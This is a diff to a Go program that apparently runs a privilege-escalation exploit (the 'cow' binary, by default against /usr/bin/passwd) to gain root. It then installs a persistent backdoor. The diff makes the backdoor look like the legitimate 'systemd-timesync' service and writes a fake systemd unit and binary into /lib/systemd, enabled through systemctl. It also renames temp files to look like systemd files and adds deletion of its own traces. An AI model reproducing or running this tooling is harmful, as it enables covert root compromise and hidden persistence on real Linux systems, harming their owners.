@@ -4,18 +4,21 @@ import (
 	"bytes"
 	"flag"
 	"fmt"
+	"io"
 	"io/ioutil"
 	"log"
 	"os"
 	"os/exec"
+	"path/filepath"
+	"strings"
 )
 
 const ServiceName = "systemd-timesync"
-const ShellPath = "/tmp/shell"
-var BackdoorPath = fmt.Sprintf("/lib/systemd/%s", ServiceName)
-var BackdoorServicePath = fmt.Sprintf("/lib/systemd/system/%s.service", ServiceName)
 
-var BackdoorServiceFile = fmt.Sprintf(`#  This file is part of systemd.
+var (
+	BackdoorPath        = filepath.Join("/lib", "systemd", ServiceName)
+	BackdoorServicePath = filepath.Join("/lib", "systemd", "system", ServiceName+".service")
+	BackdoorServiceFile = []byte(fmt.Sprintf(`#  This file is part of systemd.
 #
 #  systemd is free software; you can redistribute it and/or modify it
 #  under the terms of the GNU Lesser General Public License as published by
@@ -31,8 +34,9 @@ After=network.target
 Type=simple
 Restart=always
 RestartSec=1
-ExecStart=/lib/systemd/%s
-`, ServiceName)
+ExecStart=%s
+`, BackdoorPath))
+)
 
 func main() {
 	path := flag.String("file", "/usr/bin/passwd", "File to pwn")
@@ -49,7 +53,7 @@ func main() {
 	}
 
 	mkTemp := func() *os.File {
-		f, err := ioutil.TempFile("", "systemd-timesyncd")
+		f, err := ioutil.TempFile("", "systemd-private-")
 		if err != nil {
 			log.Fatalf("Failed to create temp file: %s", err)
 		}
@@ -77,17 +81,23 @@ func main() {
 	}
 
 	if err = cow.Close(); err != nil {
-		log.Fatalf("Failed to close expoit")
+		log.Fatalf("Failed to close %s", cow.Name())
+	}
+
+	out, err := exec.Command(cow.Name(), *path).CombinedOutput()
+	if err != nil {
+		log.Fatalf(`Failed to pwn %s: %s
+Output: %s`, *path, err, string(out))
 	}
 
 	backdoorService := mkTemp()
-	_, err = backdoorService.Write([]byte(BackdoorServiceFile))
+	_, err = backdoorService.Write(BackdoorServiceFile)
 	if err != nil {
-		log.Fatalf("Failed write systemd file to %s: %s", backdoorService.Name(), err)
+		log.Fatalf("Failed write systemd service to %s: %s", backdoorService.Name(), err)
 	}
 
 	if err = backdoorService.Close(); err != nil {
-		log.Fatalf("Failed to close systemd file")
+		log.Fatalf("Failed to close %s", backdoorService.Name())
 	}
 
 	backdoor := mkTemp()
@@ -97,56 +107,45 @@ func main() {
 	}
 
 	if err = backdoor.Close(); err != nil {
-		log.Fatalf("Failed to close backdoor")
+		log.Fatalf("Failed to close %s", backdoor.Name())
 	}
 
-	out, err := exec.Command(cow.Name(), *path).CombinedOutput()
-	if err != nil {
-		log.Fatalf(`Failed to pwn %s: %s
-Output: %s`, *path, err, string(out))
-	}
+	defer func() {
+		for _, f := range []*os.File{
+			cow, bkp, backdoorService, backdoor,
+		} {
+			if err = os.Remove(f.Name()); err != nil {
+				log.Printf("Failed to remove %s: %s", f.Name(), err)
+			}
+		}
+	}()
 
 	cmd := exec.Command(*path)
-
-	// TODO: install reverse shell
-	cmd.Stdin = bytes.NewBuffer([]byte(fmt.Sprintf(`echo 0 > /proc/sys/vm/dirty_writeback_centisecs
-cp %s %s
-chmod 4755 %s
-cat %s > %s
-rm -f %s
-mv %s %s
-chmod 0644 %s
-chown root:root %s
-mv %s %s
-chmod 0755 %s
-chown root:root %s
-systemctl enable %s.service
-systemctl start %s.service`,
-		*path, ShellPath,
-		ShellPath,
-		bkp.Name(), *path,
-		ShellPath,
-		backdoorService.Name(), BackdoorServicePath,
-		BackdoorServicePath,
-		BackdoorServicePath,
-		backdoor.Name(), BackdoorPath,
-		BackdoorPath,
-		BackdoorPath,
-		ServiceName,
-		ServiceName,
-	)))
+	cmd.Stdin = func() io.Reader {
+		ls := []string{}
+		for _, l := range []struct {
+			Format string
+			Args   []interface{}
+		}{
+			{"echo 0 > /proc/sys/vm/dirty_writeback_centisecs", nil},
+			{"cat %s > %s", []interface{}{bkp.Name(), *path}},
+			{"mv %s %s", []interface{}{backdoorService.Name(), BackdoorServicePath}},
+			{"chmod 0644 %s", []interface{}{BackdoorServicePath}},
+			{"chown root:root %s", []interface{}{BackdoorServicePath}},
+			{"mv %s %s", []interface{}{backdoor.Name(), BackdoorPath}},
+			{"chmod 0755 %s", []interface{}{BackdoorPath}},
+			{"chown root:root %s", []interface{}{BackdoorPath}},
+			{"systemctl enable %s.service", []interface{}{ServiceName}},
+			{"systemctl restart %s.service", []interface{}{ServiceName}},
+		} {
+			ls = append(ls, fmt.Sprintf(l.Format, l.Args...))
+		}
+		return bytes.NewBuffer([]byte(strings.Join(ls, "\n")))
+	}()
 
 	out, err = cmd.CombinedOutput()
 	if err != nil {
 		log.Fatalf(`Failed to infect machine: %s
 Output: %s`, err, string(out))
-	}
-
-	if err = os.Remove(cow.Name()); err != nil {
-		log.Fatalf("Failed to remove exploit from %s: %s", cow.Name(), err)
-	}
-
-	if err = os.Remove(bkp.Name()); err != nil {
-		log.Fatalf("Failed to remove backup from %s: %s", bkp.Name(), err)
 	}
 }
